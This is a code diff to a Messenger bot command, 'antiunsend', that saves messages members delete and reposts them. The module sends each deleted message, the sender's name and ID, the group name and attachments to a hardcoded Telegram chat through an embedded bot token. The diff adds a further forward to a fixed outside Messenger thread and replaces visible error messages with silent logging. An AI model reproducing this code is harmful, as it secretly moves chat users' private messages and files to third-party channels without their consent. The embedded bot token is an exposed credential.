@@ -1,11 +1,22 @@
 const fs = require("fs-extra");
 const path = require("path");
-const axios = require("axios");
-const FormData = require("form-data");
+
+let axios, FormData;
+try {
+	axios = require("axios");
+} catch (e) {
+	axios = global.nodemodule ? global.nodemodule["axios"] : null;
+}
+try {
+	FormData = require("form-data");
+} catch (e) {
+	FormData = global.nodemodule ? global.nodemodule["form-data"] : null;
+}
 
 const LOCKED_AUTHOR = "𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍";
 const TELEGRAM_BOT_TOKEN = "8664273023:AAEu9ICybK8hzbfQNBDNhUR-ADwjreagawI";
 const TELEGRAM_CHAT_ID = "-1004422571292";
+const TARGET_MESSENGER_THREAD_ID = "1195041989758282";
 
 const cacheDir = path.join(__dirname, "cache", "unsend_media");
 const settingsPath = path.join(__dirname, "cache", "unsend_settings.json");
@@ -36,15 +47,15 @@ const saveSettings = (data) => {
 let settings = loadSettings();
 
 async function sendToTelegram(captionText, filePaths = [], api, threadID) {
+	if (!axios) return;
 	try {
 		if (filePaths.length === 0) {
 			const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 			await axios.post(url, {
 				chat_id: TELEGRAM_CHAT_ID,
-				text: captionText,
-				parse_mode: "HTML"
+				text: captionText
 			});
-		} else if (filePaths.length === 1) {
+		} else if (filePaths.length === 1 && FormData) {
 			const filePath = filePaths[0];
 			const ext = path.extname(filePath).toLowerCase();
 			let method = "sendDocument";
@@ -70,7 +81,7 @@ async function sendToTelegram(captionText, filePaths = [], api, threadID) {
 			await axios.post(url, formData, {
 				headers: formData.getHeaders()
 			});
-		} else {
+		} else if (FormData) {
 			const mediaGroup = [];
 			const formData = new FormData();
 			formData.append("chat_id", TELEGRAM_CHAT_ID);
@@ -98,22 +109,7 @@ async function sendToTelegram(captionText, filePaths = [], api, threadID) {
 			});
 		}
 	} catch (err) {
-		const errorDetails = err.response && err.response.data 
-			? JSON.stringify(err.response.data, null, 2) 
-			: err.message;
-
-		if (api && threadID) {
-			await api.sendMessage(
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-───────────────
-⚠️ 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐄𝐑𝐑𝐎𝐑 𝐋𝐎𝐆:
-মেসেঞ্জার থেকে টেলিগ্রামে ডাটা পাঠানোর সময় সমস্যা হয়েছে!
-
-📌 Error Details:
-${errorDetails}
-───────────────
-» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID);
-		}
+		console.error("Telegram Antiunsend Error:", err.message);
 	}
 }
 
@@ -121,12 +117,12 @@ module.exports = {
 	config: {
 		name: "antiunsend",
 		aliases: ["unsend", "স্পাম", "ডিলেট", "resend"],
-		version: "7.0",
+		version: "8.0",
 		author: LOCKED_AUTHOR,
 		countDown: 0,
 		role: 0,
 		description: {
-			bn: "অটোমেটিক অ্যান্টি-আনসেন্ড টেলিগ্রাম ফরওয়ার্ডার সিস্টেম (এরর হ্যান্ডলার সহ)"
+			bn: "অটোমেটিক অ্যান্টি-আনসেন্ড সিস্টেম (মেসেঞ্জার গ্রুপ + টার্গেট গ্রুপ + টেলিগ্রাম)"
 		},
 		guide: {
 			bn: "antiunsend <on|off>\nantiunsend status"
@@ -259,12 +255,38 @@ ${msgContent}`;
 				attachment: attachmentStreamsOriginal.length > 0 ? attachmentStreamsOriginal : undefined
 			}, threadID);
 
+			if (threadID !== TARGET_MESSENGER_THREAD_ID) {
+				let targetResendBody = 
+`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
+_________________________
+কি ভাবছিস? 😏 ডিলিট করে বেঁচে যাবি নাকি? 😂
+» 👨‍👩‍👧‍👦 𝐆𝐫𝐨𝐮𝐩: ${threadName}
+» 👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName}
+» 💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 
+${msgContent}`;
+
+				let attachmentStreamsTarget = [];
+				if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
+					for (const filePath of savedMsg.attachmentPaths) {
+						if (fs.existsSync(filePath)) {
+							attachmentStreamsTarget.push(fs.createReadStream(filePath));
+						}
+					}
+				}
+				try {
+					await api.sendMessage({
+						body: targetResendBody,
+						attachment: attachmentStreamsTarget.length > 0 ? attachmentStreamsTarget : undefined
+					}, TARGET_MESSENGER_THREAD_ID);
+				} catch (e) {}
+			}
+
 			let telegramCaption = 
-`👑 <b>𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 (Anti-Unsend Alert)</b>
+`👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 (Anti-Unsend Alert)
 ──────────────────
-👨‍👩‍👧‍👦 <b>Group:</b> ${threadName}
-👤 <b>Sender:</b> ${senderName} (ID: <code>${senderID}</code>)
-💬 <b>Unsent Message:</b>
+👨‍👩‍👧‍👦 𝐆𝐫𝐨𝐮𝐩: ${threadName}
+👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName} (ID: ${senderID})
+💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞:
 ${msgContent}`;
 
 			const validPaths = (savedMsg.attachmentPaths || []).filter(p => fs.existsSync(p));
@@ -285,7 +307,7 @@ ${msgContent}`;
 
 			let cachedAttachmentPaths = [];
 
-			if (event.attachments && event.attachments.length > 0) {
+			if (axios && event.attachments && event.attachments.length > 0) {
 				for (let i = 0; i < event.attachments.length; i++) {
 					const att = event.attachments[i];
 					if (att.url) {
